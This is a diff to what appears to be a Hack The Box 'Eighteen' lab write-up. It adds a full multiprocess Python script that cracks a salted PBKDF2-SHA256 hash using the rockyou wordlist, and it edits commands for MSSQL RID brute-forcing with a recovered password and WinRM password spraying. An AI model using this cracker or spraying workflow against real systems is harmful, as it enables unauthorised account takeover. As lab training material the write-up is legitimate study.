@@ -152,8 +152,53 @@ sha256:600000:AMtXXXXXXXXXXXX:0673ad90aXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 Create the cracking script:
 
 ```
-nano pass.py
+cat << 'EOF' > pass.py
+#!/usr/bin/env python3
+import hashlib
+from multiprocessing import Pool, cpu_count
+
+SALT = "AMtzteQIG7yAbZIa"
+ITERATIONS = 600000
+TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
+WORDLIST = "/usr/share/wordlists/rockyou.txt"
+
+def check_password(password: bytes):
+    try:
+        computed = hashlib.pbkdf2_hmac(
+            'sha256',
+            password,
+            SALT.encode(),
+            ITERATIONS
+        )
+        if computed.hex() == TARGET_HASH:
+            return password.decode(errors="ignore")
+    except Exception:
+        pass
+    return None
+
+def main():
+    print(f"[+] Using wordlist: {WORDLIST}")
+    print("[+] Starting PBKDF2-SHA256 cracking...")
+
+    with open(WORDLIST, "rb") as f:
+        passwords = (line.strip() for line in f)
+
+        with Pool(cpu_count()) as pool:
+            for result in pool.imap_unordered(
+                check_password, passwords, chunksize=500
+            ):
+                if result:
+                    print(f"[+] PASSWORD FOUND: {result}")
+                    pool.terminate()
+                    return
+
+    print("[-] No match found.")
+
+if __name__ == "__main__":
+    main()
+EOF
 ```
+
 
 Run the script:
 
@@ -178,13 +223,13 @@ nxc mssql 10.10.11.95 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
 Create user list:
 
 ```
-nano users.txt
+nano user.txt
 ```
 
 Password spraying:
 
 ```
-crackmapexec winrm 10.10.11.95 -u users.txt -p 'ilXXXXXxX'
+crackmapexec winrm 10.10.11.95 -u user.txt -p 'ilXXXXXxX'
 ```
 ![Eighteen](htb_eighteen_adamscott_pass.jpg)
 
